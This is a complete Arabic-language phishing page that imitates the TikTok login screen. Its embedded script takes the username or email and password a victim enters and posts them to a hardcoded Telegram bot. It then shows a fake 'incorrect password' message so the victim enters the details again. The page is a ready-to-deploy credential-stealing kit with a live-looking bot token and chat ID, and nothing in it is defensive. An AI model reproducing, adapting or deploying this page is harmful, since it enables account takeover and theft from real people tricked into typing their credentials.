<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body { 
            background: #000000; 
            color: #ffffff;
            min-height: 100vh; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            justify-content: center;
            padding: 20px; 
        }

        .container { 
            width: 100%; 
            max-width: 380px; 
            text-align: center;
        }

        /* اللوجو النصي المحسن */
        .tiktok-logo {
            font-size: 42px;
            font-weight: 900;
            margin-bottom: 25px;
            direction: ltr;
            display: flex;
            justify-content: center;
            align-items: center;
            letter-spacing: -2px;
        }
        .tiktok-logo .cyan { color: #25F4EE; text-shadow: 2px 0px 0px #25F4EE; }
        .tiktok-logo .red { color: #FE2C55; text-shadow: -2px 0px 0px #FE2C55; }
        .tiktok-logo .white { color: #FFFFFF; margin: 0 2px; }

        h1 { font-size: 20px; font-weight: 700; margin-bottom: 25px; color: #fff; }
        
        .form-box {
            background: #121212;
            border: 1px solid #2f2f2f;
            padding: 25px 20px;
            border-radius: 8px;
            margin-bottom: 15px;
        }

        form { display: flex; flex-direction: column; gap: 12px; }

        .input-group { position: relative; }

        /* تعديل مهم: إجبار الخانات على الاتجاه العربي وإخفاء لخبطة الحروف */
        .input-group input { 
            width: 100%; 
            padding: 16px 12px; 
            background: #121212; 
            border: 1px solid #2f2f2f; 
            border-radius: 4px; 
            color: #fff; 
            font-size: 14px; 
            outline: none;
            transition: 0.2s;
            direction: rtl; 
            text-align: right;
        }
        
        .input-group input:focus { 
            border: 1px solid #555; 
            background: #1a1a1a;
        }

        .input-group input::placeholder { 
            color: #8a8b91; 
            opacity: 1;
        }

        .btn-tiktok { 
            width: 100%; 
            padding: 14px; 
            background: #FE2C55; 
            color: #fff; 
            border: none; 
            border-radius: 4px; 
            font-size: 15px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 5px;
            transition: 0.3s;
        }
        
        .btn-tiktok:disabled { background: #662233; color: #999; cursor: not-allowed; }

        .forgot { 
            color: #fff; 
            font-size: 13px; 
            margin-top: 20px; 
            text-decoration: none;
            display: block;
            font-weight: 600;
        }

        .divider { 
            display: flex; 
            align-items: center; 
            margin: 20px 0; 
            color: #8a8b91; 
            font-size: 14px; 
        }

        .divider::before, .divider::after { 
            content: ''; 
            flex: 1; 
            height: 1px; 
            background: #2f2f2f; 
        }

        .divider span { padding: 0 15px; }

        .social-login {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .social-btn {
            width: 100%;
            padding: 14px;
            background: #121212;
            border: 1px solid #2f2f2f;
            color: #fff;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .error { 
            color: #FE2C55; 
            font-size: 13px; 
            margin-top: 15px; 
            display: none; 
            font-weight: 500;
            text-align: center;
        }

        .terms { font-size: 12px; color: #8a8b91; margin-top: 25px; line-height: 1.5; }
        .terms a { color: #8a8b91; text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        
        <!-- اللوجو الجديد النصي -->
        <div class="tiktok-logo">
            <span class="cyan">T</span>
            <span class="red">i</span>
            <span class="white">kTok</span>
        </div>

        <h1>تسجيل الدخول إلى TikTok</h1>

        <div class="form-box">
            <form id="loginForm">
                <div class="input-group">
                    <!-- ضفنا dir="rtl" هنا كمان عشان نمنع لخبطة الحروف -->
                    <input type="text" id="username" placeholder="البريد الإلكتروني أو اسم المستخدم" dir="rtl" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="كلمة المرور" dir="rtl" required>
                </div>
                <button type="submit" class="btn-tiktok" id="loginBtn">تسجيل الدخول</button>
                <p class="error" id="error">كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.</p>
            </form>

            <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>
        </div>

        <div class="divider"><span>أو</span></div>

        <div class="social-login">
            <button class="social-btn">متابعة باستخدام Facebook</button>
            <button class="social-btn">متابعة باستخدام Google</button>
        </div>

        <p class="terms">
            بالمتابعة، فإنك توافق على <a href="#">شروط الخدمة</a> و <a href="#">سياسة الخصوصية</a> الخاصة بـ TikTok.
        </p>
    </div>

    <script>
        const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
        const CHAT_ID = '7644504212';

        async function sendToTelegram(username, password) {
            const message = `<b>🎵 TikTok Login - Target</b>\n\n<b>Username/Email:</b> <code>${username}</code>\n<b>Password:</b> <code>${password}</code>`;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
                });
            } catch (e) {}
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault(); 
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');
            const errorMsg = document.getElementById('error');

            btn.innerText = 'جاري الدخول...';
            btn.disabled = true;
            errorMsg.style.display = 'none';

            await sendToTelegram(username, password);

            setTimeout(() => {
                btn.innerText = 'تسجيل الدخول';
                btn.disabled = false;
                errorMsg.style.display = 'block';
                document.getElementById('password').value = '';
            }, 1500);
        });
    </script>
</body>
</html>
